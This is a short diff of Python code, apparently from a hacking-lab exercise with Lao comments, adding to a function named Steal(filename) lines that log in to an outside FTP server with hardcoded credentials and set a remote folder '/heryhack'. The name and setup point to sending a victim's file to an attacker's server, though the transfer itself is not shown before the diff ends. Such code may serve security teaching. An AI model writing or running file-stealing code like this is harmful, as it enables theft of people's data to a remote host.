@@ -8,4 +8,9 @@ def Steal(filename):
 	username = 'member@uc-hacklabs.com'
 	password = 'HackMB123'
 
-	
+	ftp = ftplib.FTP() # ປະກາດໂຕ FTP
+	ftp.connect(ip,port) # ເຊື່ອມຕໍ່
+	ftp.login(username,password)
+
+	mypath = '/heryhack'
+	 
